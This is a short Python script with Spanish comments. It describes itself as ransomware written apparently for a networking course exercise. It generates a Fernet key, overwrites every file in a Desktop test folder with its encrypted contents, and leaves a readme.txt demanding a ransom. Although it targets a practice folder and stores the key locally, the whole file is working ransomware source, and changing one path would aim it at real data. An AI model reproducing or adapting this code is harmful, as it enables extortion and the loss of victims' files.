from cryptography.fernet import Fernet
import os
import getpass


# Para la prueba de este programa es necesario la creacion de una carpeta
# en el escritorio de nombre "Ataque" y dentro de esta otra carpeta
# de nombre "Primera prueba"

# Este archivo es el ransomware como tal y se encarga de encriptar
# los archivos y pedir el rescate


# Genera la key con la que se encriptara los archivos y la exporta en un archivo con extension key

def generarkey():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)


# Permite obtener el key que permite la encripcion y la desencripcion
def retornarkey():
    return open("key.key", "rb").read()


# Permite la encripcion de los archivos contenidos en el directorio indicado
# esto se realiza a traves de la encripcion de Fernet
def encrypt(items, key):
    i = Fernet(key)
    for x in items:
        with open(x, "rb") as file:
            file_data = file.read()
        data = i.encrypt(file_data)

        with open(x, "wb") as file:
            file.write(data)


# Permite que el codigo se ejecute en el modulo es el equivalente a la funcion main en JAVA
if __name__ == "__main__":
    archivos = 'C:\\Users\\' + getpass.getuser() + '\\Desktop\\Ataque\\Primera prueba'
    items = os.listdir(archivos)
    archivos_2 = [archivos + "\\" + x for x in items]

generarkey()
key = retornarkey()

encrypt(archivos_2, key)

with open(archivos + "\\" + "readme.txt", "w") as file:
    file.write("Archivos encriptados por practica de Fundamentos de Redes \nSe solicita un rescate")
